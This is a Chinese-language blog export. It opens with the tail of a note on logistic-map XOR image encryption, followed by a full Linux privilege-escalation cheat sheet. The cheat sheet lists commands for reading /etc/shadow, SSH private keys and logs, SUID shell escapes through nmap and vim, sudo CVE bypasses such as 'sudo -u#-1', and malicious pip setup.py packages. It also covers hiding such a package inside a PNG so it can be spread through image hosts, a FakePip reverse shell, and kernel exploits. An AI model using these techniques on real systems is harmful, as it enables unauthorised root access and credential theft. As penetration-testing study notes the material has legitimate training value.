class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,num-<span class="number">1</span>):</span><br><span class="line">        E[i+<span class="number">1</span>] = mu * E[i] * (<span class="number">1</span>-E[i])</span><br><span class="line">    E = np.<span class="built_in">round</span>(E*<span class="number">255</span>).astype(np.uint8)</span><br><span class="line"></span><br><span class="line">    im = np.bitwise_xor(E, im)</span><br><span class="line">    im = im.reshape(width, height, -<span class="number">1</span>)</span><br><span class="line">    im = np.squeeze(im)</span><br><span class="line">    im = Image.fromarray(im)</span><br><span class="line">    <span class="keyword">return</span> im</span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>)</span><br><span class="line"><span class="comment"># im = im.convert(&quot;L&quot;)</span></span><br><span class="line">x0 = <span class="number">0.43</span></span><br><span class="line">mu = <span class="number">3.9</span></span><br><span class="line"></span><br><span class="line">im_de = logistic(im, x0, mu)</span><br><span class="line">im_de.save(<span class="string">f&#x27;flagde.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>该实现可以应用于彩色图片和灰度图。</p>
<p>同时我还实现了一个 Logistic 的迭代器：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">LogisticRange</span>(<span class="params">x0: <span class="built_in">int</span>, mu: <span class="built_in">int</span>, limit: <span class="built_in">int</span>, times: <span class="built_in">int</span> = <span class="number">500</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Logistic序列有限迭代器</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        x0 - 初始密钥</span></span><br><span class="line"><span class="string">        mu - 初始密钥</span></span><br><span class="line"><span class="string">        limit - 序列上限</span></span><br><span class="line"><span class="string">        times - 混沌系统的迭代次数</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        序列值</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        x0 = mu * x0 * (<span class="number">1</span> - x0)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(limit):</span><br><span class="line">        <span class="keyword">yield</span> x0</span><br><span class="line">        x0 = mu * x0 * (<span class="number">1</span> - x0)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LogisticCount</span>(<span class="params">x0: <span class="built_in">int</span>, mu: <span class="built_in">int</span>, times: <span class="built_in">int</span> = <span class="number">500</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Logistic序列无限迭代器</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        x0 - 初始密钥</span></span><br><span class="line"><span class="string">        mu - 初始密钥</span></span><br><span class="line"><span class="string">        times - 混沌系统的迭代次数</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        序列值</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        x0 = mu * x0 * (<span class="number">1</span> - x0)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span> x0</span><br><span class="line">        x0 = mu * x0 * (<span class="number">1</span> - x0)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title>linux提权笔记</title>
    <url>//linux-privilege-escalation-note.html</url>
    <content><![CDATA[<h1 id="简述">简述</h1>
<p>无法执行root 权限下的一下命令或者读取/root
下的重要文件。这个时候就需要提权，在root
权限下，还可以通过msfvenom生成其他后门文件或者一些隐藏后门。添加用户，开启其他端口等操作，达到权限持续控制。</p>
<p>boot2root 是提权种类的一种，本质还是与 Linux 的提权有关系。</p>
<p>Linux 提权主要是通过下面的方式：</p>
<ul>
<li>收集 —— 将尽可能多的信息穷举出来</li>
<li>处理 —— 将信息分类，确定信息的有效性，按照其权重来排序</li>
<li>搜索 —— 擅用搜索引擎，发现、查找、利用漏洞代码</li>
<li>调整 ——
利用现有的信息，调整漏洞利用代码（不同的操作系统可能有不同的利用）</li>
<li>尝试 —— 通过大量的尝试来寻找正确答案</li>
</ul>
<h1 id="信息收集">信息收集</h1>
<h2 id="操作系统">操作系统</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a    				<span class="comment"># 打印所有可用的系统信息</span></span><br><span class="line"><span class="built_in">uname</span> -r    				<span class="comment"># 内核版本</span></span><br><span class="line"><span class="built_in">uname</span> -n    				<span class="comment"># 系统主机名。</span></span><br><span class="line"><span class="built_in">uname</span> -m    				<span class="comment"># 查看系统内核架构（64位/32位）</span></span><br><span class="line"><span class="built_in">uname</span> -mrs    				<span class="comment"># 查看系统内核架构（64位/32位）</span></span><br><span class="line">hostname    				<span class="comment"># 系统主机名</span></span><br><span class="line"><span class="built_in">cat</span> /proc/version    		<span class="comment"># 内核信息</span></span><br><span class="line"><span class="built_in">cat</span> /etc/*-release   		<span class="comment"># 分发信息</span></span><br><span class="line"><span class="built_in">cat</span> /etc/issue       		<span class="comment"># 分发信息</span></span><br><span class="line"><span class="built_in">cat</span> /proc/cpuinfo    		<span class="comment"># CPU信息</span></span><br><span class="line"><span class="built_in">cat</span> /etc/lsb-release		<span class="comment"># Debian based</span></span><br><span class="line"><span class="built_in">cat</span> /etc/redhat-release		<span class="comment"># Redhat based</span></span><br><span class="line"><span class="built_in">ls</span> /boot | grep vmlinuz-	<span class="comment"># 内核版本</span></span><br></pre></td></tr></table></figure>
<h2 id="环境变量">环境变量</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">env</span>        					<span class="comment"># 显示环境变量</span></span><br><span class="line"><span class="built_in">set</span>        					<span class="comment"># 现实环境变量</span></span><br><span class="line"><span class="built_in">echo</span> %PATH 					<span class="comment"># 路径信息</span></span><br><span class="line"><span class="built_in">history</span>    					<span class="comment"># 显示当前用户的历史命令记录</span></span><br><span class="line"><span class="built_in">pwd</span>        					<span class="comment"># 输出工作目录</span></span><br><span class="line"><span class="built_in">cat</span> /etc/profile   			<span class="comment"># 显示默认系统变量</span></span><br><span class="line"><span class="built_in">cat</span> /etc/shells    			<span class="comment"># 显示可用的shellrc</span></span><br><span class="line"><span class="built_in">cat</span> /etc/bashrc</span><br><span class="line"><span class="built_in">cat</span> ~/.bash_profile</span><br><span class="line"><span class="built_in">cat</span> ~/.bashrc</span><br><span class="line"><span class="built_in">cat</span> ~/.bash_logout</span><br><span class="line"><span class="built_in">cat</span> /proc/??/environ		<span class="comment"># ??表示两个符号</span></span><br></pre></td></tr></table></figure>
<h2 id="打印机服务">打印机服务</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lpstat -a</span><br></pre></td></tr></table></figure>
<h2 id="用户和群组">用户和群组</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd     		<span class="comment"># 列出系统上的所有用户</span></span><br><span class="line"><span class="built_in">cat</span> /var/mail/root</span><br><span class="line"><span class="built_in">cat</span> /var/spool/mail/root</span><br><span class="line"><span class="built_in">cat</span> /etc/group      		<span class="comment"># 列出系统上的所有组</span></span><br><span class="line">grep -v -E <span class="string">&quot;^#&quot;</span> /etc/passwd | awk -F: <span class="string">&#x27;$3 == 0 &#123; print $1&#125;&#x27;</span>      <span class="comment"># 列出所有的超级用户账户</span></span><br><span class="line"><span class="built_in">whoami</span>              		<span class="comment"># 查看当前用户</span></span><br><span class="line">w                   		<span class="comment"># 谁目前已登录，他们正在做什么</span></span><br><span class="line">last                		<span class="comment"># 最后登录用户的列表</span></span><br><span class="line">lastlog             		<span class="comment"># 所有用户上次登录的信息</span></span><br><span class="line">lastlog –u %username%  		<span class="comment"># 有关指定用户上次登录的信息</span></span><br><span class="line">lastlog |grep -v <span class="string">&quot;Never&quot;</span>  	<span class="comment"># 以前登录用户的完整信息</span></span><br></pre></td></tr></table></figure>
<h2 id="用户权限信息">用户权限信息</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">whoami</span>        当前用户名</span><br><span class="line"><span class="built_in">id</span>            当前用户信息</span><br><span class="line"><span class="built_in">cat</span> /etc/sudoers  谁被允许以root身份执行</span><br><span class="line">sudo -l       当前用户可以以root身份执行操作</span><br></pre></td></tr></table></figure>
<h2 id="进程和服务">进程和服务</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux</span><br><span class="line">ps -ef</span><br><span class="line">top</span><br><span class="line"><span class="built_in">cat</span> /etc/services</span><br></pre></td></tr></table></figure>
<p>查看以 root 运行的进程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux | grep root</span><br><span class="line">ps -ef | grep root</span><br></pre></td></tr></table></figure>
<h2 id="查看安装的软件">查看安装的软件</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -alh /usr/bin/</span><br><span class="line"><span class="built_in">ls</span> -alh /sbin/</span><br><span class="line"><span class="built_in">ls</span> -alh /var/cache/yum/</span><br><span class="line">dpkg -l</span><br></pre></td></tr></table></figure>
<h2 id="服务插件">服务/插件</h2>
<p>检查有没有不安全的服务配置，和一些有漏洞的插件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/syslog.conf</span><br><span class="line"><span class="built_in">cat</span> /etc/chttp.conf</span><br><span class="line"><span class="built_in">cat</span> /etc/lighttpd.conf</span><br><span class="line"><span class="built_in">cat</span> /etc/cups/cupsd.conf</span><br><span class="line"><span class="built_in">cat</span> /etc/inetd.conf</span><br><span class="line"><span class="built_in">cat</span> /etc/apache2/apache2.conf</span><br><span class="line"><span class="built_in">cat</span> /etc/my.conf</span><br><span class="line"><span class="built_in">cat</span> /etc/httpd/conf/httpd.conf</span><br><span class="line"><span class="built_in">cat</span> /opt/lampp/etc/httpd.conf</span><br><span class="line"><span class="built_in">ls</span> -aRl /etc/ | awk <span class="string">&#x27;$1 ~ /^.*r.*/</span></span><br></pre></td></tr></table></figure>
<h2 id="计划任务">计划任务</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br><span class="line"><span class="built_in">ls</span> -alh /var/spool/cron</span><br><span class="line"><span class="built_in">ls</span> -al /etc/ | grep cron</span><br><span class="line"><span class="built_in">ls</span> -al /etc/cron*</span><br><span class="line"><span class="built_in">cat</span> /etc/cron*</span><br><span class="line"><span class="built_in">cat</span> /etc/at.allow</span><br><span class="line"><span class="built_in">cat</span> /etc/at.deny</span><br><span class="line"><span class="built_in">cat</span> /etc/cron.allow</span><br><span class="line"><span class="built_in">cat</span> /etc/cron.deny</span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br><span class="line"><span class="built_in">cat</span> /etc/anacrontab</span><br><span class="line"><span class="built_in">cat</span> /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
<h2 id="有无明文存放用户密码">有无明文存放用户密码</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -i user [filename]</span><br><span class="line">grep -i pass [filename]</span><br><span class="line">grep -C 5 <span class="string">&quot;password&quot;</span> [filename]</span><br><span class="line">find , -name <span class="string">&quot;*.php&quot;</span> -print0 | xargs -0 grep -i -n <span class="string">&quot;var <span class="variable">$password</span>&quot;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>比如说可能使用邮件明文传输密码；</p>
<p>又或者说 MySQL 中明文存放用户密码。</p>
</blockquote>
<h2 id="有无-ssh-私钥">有无 ssh 私钥</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/identity.pub</span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/identity</span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa.pub</span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa</span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_dsa.pub</span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_dsa</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/ssh_config</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/sshd_config</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/ssh_host_dsa_key</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/ssh_host_rsa_key</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/ssh_host_key.pub</span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/ssh_host_key</span><br></pre></td></tr></table></figure>
<h2 id="查看与当前机器通信的其他用户或者主机">查看与当前机器通信的其他用户或者主机</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof -i</span><br><span class="line">lsof -i :80</span><br><span class="line">grep 80 /etc/services</span><br><span class="line">netstat -antup</span><br><span class="line">netstat -antpx</span><br><span class="line">netstat -tulpn</span><br><span class="line">chkconfig --list</span><br><span class="line">chkconfig --list | grep 3:on</span><br><span class="line">last</span><br><span class="line">w</span><br></pre></td></tr></table></figure>
<h2 id="日志文件">日志文件</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/boot.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/cron</span><br><span class="line"><span class="built_in">cat</span> /var/log/syslog</span><br><span class="line"><span class="built_in">cat</span> /var/log/wtmp</span><br><span class="line"><span class="built_in">cat</span> /var/run/utmp</span><br><span class="line"><span class="built_in">cat</span> /etc/httpd/logs/access_log</span><br><span class="line"><span class="built_in">cat</span> /etc/httpd/logs/access.log</span><br><span class="line"><span class="built_in">cat</span> /etc/httpd/logs/error_log</span><br><span class="line"><span class="built_in">cat</span> /etc/httpd/logs/error.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/apache2/access_log</span><br><span class="line"><span class="built_in">cat</span> /var/log/apache2/access.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/apache2/error_log</span><br><span class="line"><span class="built_in">cat</span> /var/log/apache2/error.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/apache/access_log</span><br><span class="line"><span class="built_in">cat</span> /var/log/apache/access.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/auth.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/chttp.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/cups/error_log</span><br><span class="line"><span class="built_in">cat</span> /var/log/dpkg.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/faillog</span><br><span class="line"><span class="built_in">cat</span> /var/log/httpd/access_log</span><br><span class="line"><span class="built_in">cat</span> /var/log/httpd/access.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/httpd/error_log</span><br><span class="line"><span class="built_in">cat</span> /var/log/httpd/error.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/lastlog</span><br><span class="line"><span class="built_in">cat</span> /var/log/lighttpd/access.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/lighttpd/error.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/lighttpd/lighttpd.access.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/lighttpd/lighttpd.error.log</span><br><span class="line"><span class="built_in">cat</span> /var/log/messages</span><br><span class="line"><span class="built_in">cat</span> /var/log/secure</span><br><span class="line"><span class="built_in">cat</span> /var/log/syslog</span><br><span class="line"><span class="built_in">cat</span> /var/log/wtmp</span><br><span class="line"><span class="built_in">cat</span> /var/log/xferlog</span><br><span class="line"><span class="built_in">cat</span> /var/log/yum.log</span><br><span class="line"><span class="built_in">cat</span> /var/run/utmp</span><br><span class="line"><span class="built_in">cat</span> /var/webmin/miniserv.log</span><br><span class="line"><span class="built_in">cat</span> /var/www/logs/access_log</span><br><span class="line"><span class="built_in">cat</span> /var/www/logs/access.log</span><br><span class="line"><span class="built_in">ls</span> -alh /var/lib/dhcp3/</span><br><span class="line"><span class="built_in">ls</span> -alh /var/log/postgresql/</span><br><span class="line"><span class="built_in">ls</span> -alh /var/log/proftpd/</span><br><span class="line"><span class="built_in">ls</span> -alh /var/log/samba/</span><br><span class="line"></span><br><span class="line">Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp</span><br></pre></td></tr></table></figure>
<h2 id="敏感文件">敏感文件</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line"><span class="built_in">cat</span> /etc/group</span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br><span class="line"><span class="built_in">ls</span> -alh /var/mail/</span><br><span class="line"><span class="built_in">ls</span> -ahlR /root/</span><br><span class="line"><span class="built_in">ls</span> -ahlR /home/</span><br></pre></td></tr></table></figure>
<h2 id="特殊的数据库配置文件">特殊的数据库、配置文件</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/apache2/config.inc</span><br><span class="line"><span class="built_in">cat</span> /var/lib/mysql/mysql/user.MYD</span><br><span class="line"><span class="built_in">cat</span> /root/anaconda-ks.cfg</span><br></pre></td></tr></table></figure>
<h2 id="交互式shell">交互式shell</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> os.system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br><span class="line">/bin/sh -i</span><br></pre></td></tr></table></figure>
<h2 id="查看安装过的工具">查看安装过的工具</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name perl*</span><br><span class="line">find / -name python*</span><br><span class="line">find / -name gcc*</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h2 id="通讯与网络">通讯与网络</h2>
<h4 id="系统有哪些-nic它是否连接到另一个网络">系统有哪些
NIC？<em>它是否连接到另一个网络？</em></h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/sbin/ifconfig -a <span class="built_in">cat</span> /etc/network/interfaces <span class="built_in">cat</span> /etc/sysconfig/network </span><br></pre></td></tr></table></figure>
<h4 id="网络配置设置是什么你能从这个网络中找到什么dhcp服务器域名服务器网关">网络配置设置是什么？<em>你能从这个网络中找到什么？DHCP服务器？域名服务器？网关？</em></h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/resolv.conf <span class="built_in">cat</span> /etc/sysconfig/network <span class="built_in">cat</span> /etc/networks iptables -L hostname dnsdomainname </span><br></pre></td></tr></table></figure>
<h4 id="还有哪些其他用户和主机正在与系统通信">还有哪些其他用户和主机正在与系统通信？</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w </span><br></pre></td></tr></table></figure>
<h4 id="缓存了什么ip-和或-mac-地址">缓存了什么？<em>IP 和/或 MAC
地址</em></h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arp -e route /sbin/route -nee </span><br></pre></td></tr></table></figure>
<h4 id="数据包嗅探可能吗能看到什么">数据包嗅探可能吗？能看到什么？</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21</span><br></pre></td></tr></table></figure>
<h3 id="可提权suid-guid">可提权SUID &amp;&amp; GUID</h3>
<blockquote>
<p>参考资料https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -1000 -<span class="built_in">type</span> d 2&gt;/dev/null   <span class="comment"># Sticky bit</span></span><br><span class="line">find / -perm -g=s -<span class="built_in">type</span> f 2&gt;/dev/null    <span class="comment"># SGID (chmod 2000)</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null    <span class="comment"># SUID (chmod 4000)</span></span><br><span class="line"></span><br><span class="line">find / -perm -g=s -o -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null    <span class="comment"># SGID or SUID</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `locate -r <span class="string">&quot;bin$&quot;</span>`; <span class="keyword">do</span> find <span class="variable">$i</span> \( -perm -4000 -o -perm -2000 \) -<span class="built_in">type</span> f 2&gt;/dev/null; <span class="keyword">done</span>    <span class="comment"># 查找 /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin 或者是 *bin 是否存在 SGID or SUID （快速搜查方式）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 root (/) 开始查找是否存在 SGID or SUID, not Symbolic links, 文件夹深度为 3(可以更改), 并列出错误信息 (例如 permission denied)</span></span><br><span class="line">find / -perm -g=s -o -perm -4000 ! -<span class="built_in">type</span> l -maxdepth 3 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ld &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<h3 id="查看可写执行目录">查看可写/执行目录</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -writable -type d 2&gt;/dev/null      # world-writeable folders</span><br><span class="line">find / -perm -222 -type d 2&gt;/dev/null     # world-writeable folders</span><br><span class="line">find / -perm -o w -type d 2&gt;/dev/null     # world-writeable folders</span><br><span class="line"></span><br><span class="line">find / -perm -o x -type d 2&gt;/dev/null     # world-executable folders</span><br><span class="line"></span><br><span class="line">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders</span><br></pre></td></tr></table></figure>
<h1 id="提权">提权</h1>
<h2 id="suid-提权">SUID 提权</h2>
<p>SUID 全称是 <strong>S</strong>et owner <strong>U</strong>ser
<strong>ID</strong> up on execution。这是 Linux
给可执行文件的一个属性。通俗的理解为其他用户执行这个程序的时候可以用该程序所有者/组的权限。需要注意的是，只有程序的所有者是
0 号或其他 super user，同时拥有 SUID 权限，才可以提权。</p>
<p>在 Linux 中的权限位中通常显示为 s 或者 4000，所以无论是 s 位还是 4000
位都需要注意该程序是否可以进行利用，可以通过查找 <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>
来简要判断系统自带的程序是否可以用来提权。</p>
<p>常见的可用来提权的Linux 可执行文件有：</p>
<p>nmap, vim, find, bash, more, less, nano, cp</p>
<p>查看可以 suid 提权的可执行文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<h3 id="nmap">nmap</h3>
<p>早期nmap 具有交互模式，version
2.02～5.21（5.2.0）。这里我用metasploitable2 来演示</p>
<p><code>namp -V</code> 查看 nmap 版本信息</p>
<p><code>nmap --interactive</code> 可以进入交互模式。</p>
<p>进入交互模式后即可随意使用各种需要 root 权限的命令。</p>
<p>5.2.0 之后，nmap 还可以通过执行脚本来提权。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nse 脚本，shell.nse</span></span><br><span class="line">os.execute(&#x27;/bin/sh&#x27;)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nmap 提权</span></span><br><span class="line">nmap --script=shell.nse </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在某些发行版的Linux 可能会提权失败。</span></span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; getshell</span><br><span class="line">sudo nmap --script=getshell</span><br></pre></td></tr></table></figure>
<h3 id="vim">vim</h3>
<p>如果vim
是通过SUID运行，就会继承root用户的权限。可读取只有root能读取的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/shadow</span><br></pre></td></tr></table></figure>
<p>vim 运行shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim</span><br><span class="line">:<span class="built_in">set</span> shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
<p>同理，满足条件的 less 和 more 都可。</p>
<h3 id="date">date</h3>
<p>它从文件中读取数据，它可用于进行特权读取或在受限文件系统之外公开文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LFILE=file_to_read</span><br><span class="line"><span class="built_in">date</span> -f <span class="variable">$LFILE</span></span><br></pre></td></tr></table></figure>
<h3 id="sudo">sudo</h3>
<h4 id="cve-2023-22809">CVE-2023-22809</h4>
<p><code>sudoedit</code> 需要从环境变量中读取
<code>SUDO_EDITOR</code>、<code>VISUAL</code> 和
<code>EDITOR</code>，当攻击者在这些环境变量中修改为
<code>EDITOR='nano -- /flag'</code> 时，<code>--</code>
参数将越过保护机制。</p>
<h4 id="cve-2021-3156">CVE-2021-3156</h4>
<p><code>sudoedit</code> 错误的转义 <code>/</code>
导致触发缓冲区溢出漏洞。输入命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudoedit -s /</span><br></pre></td></tr></table></figure>
<p>可以测试是否存在漏洞，如果输出 usage 则无此漏洞影响。</p>
<h4 id="cve-2019-14287">CVE-2019-14287</h4>
<p>如果说 <code>/etc/sudoers</code> 中存在额外的用户有</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hacker ALL=(ALL,!root) /usr/bin/id</span><br></pre></td></tr></table></figure>
<p>那么表示允许 <code>hacker</code> 账户以非 <code>root</code>
外身份运行 <code>/usr/bin/id</code>，而无法以 <code>root</code>
用户运行。</p>
<p>但 <code>sudo -u</code> 允许我们通过指定 UID
的方式执行命令，当使用命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u<span class="comment">#-1 id</span></span><br></pre></td></tr></table></figure>
<p>则会让我们绕过权限保护运行程序。</p>
<h3 id="pip">pip</h3>
<p><code>pip</code> 在执行 install 命令时，会自动运行模块中的
<code>setup.py</code> 脚本。</p>
<blockquote>
<p>sudo 或者 SUID 都可以。</p>
</blockquote>
<h4 id="fakepip">FakePip</h4>
<p>参考 <a href="https://github.com/0x00-0x00/FakePip">https://github.com/0x00-0x00/FakePip</a>
可以做一个反弹 shell，将信息反弹到 VPS 上，仅需命令</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install .</span><br></pre></td></tr></table></figure>
<h4 id="linux-pip">linux pip</h4>
<p><code>/dev/tty</code> 可以略过标准输出，直接将信息输出到终端上。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;/dev/tty&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>).read(), file=f)</span><br></pre></td></tr></table></figure>
<p>例如写一个 <code>setup.py</code> 如上，随后将其打包成
ZIP（这是最简单的方式）。</p>
<blockquote>
<p>需要注意，压缩包内必须有一个文件夹，文件夹下才是
<code>setup.py</code>，即</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">- qsdztest.zip</span><br><span class="line">-- qsdztest</span><br><span class="line">--- setup.py</span><br></pre></td></tr></table></figure>
</blockquote>
<p>直接安装这个 ZIP 文件即可。</p>
<h4 id="rce.png">rce.png</h4>
<p>参考 <a href="https://github.com/52piaoyu/linux-pip-rce">https://github.com/52piaoyu/linux-pip-rce</a>，pip
会忽略图片信息，直接查找 ZIP 进行解压，然后运行其中的
<code>setup.py</code>，结合上一条，我们可以对 <code>qsdztest.zip</code>
与图片进行拼接，如</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> qsdz.png qsdztest.zip qsdz.png &gt; qsdzrce.png</span><br></pre></td></tr></table></figure>
<figure>
<img src="/linux-privilege-escalation-note/qsdzrce.png" alt="qsdzrce">
<figcaption aria-hidden="true">qsdzrce</figcaption>
</figure>
<p>好处是可以直接将图片上传到图床上，方便传播。</p>
<h2 id="利用内核漏洞">利用内核漏洞</h2>
<p>比如说对于 Ubuntu 16.04 可以直接查找漏洞的 exp 代码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br></pre></td></tr></table></figure>
<p>将 exp 下载下来，解压，编译，运行，即可 get <code>root</code>
权限。</p>
<p>还有大名鼎鼎的CVE-2016-5195，脏牛漏洞。（Linux kernel &gt;=2.6.22
并且Android也受影响</p>
<ul>
<li>https://github.com/timwr/CVE-2016-5195</li>
<li>https://github.com/gbonacini/CVE-2016-5195</li>
<li>复现参考：https://www.jianshu.com/p/df72d1ee1e3e</li>
</ul>
<p>其他内核漏洞：</p>
<p>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) –
'overlayfs' Local Root Shell</p>
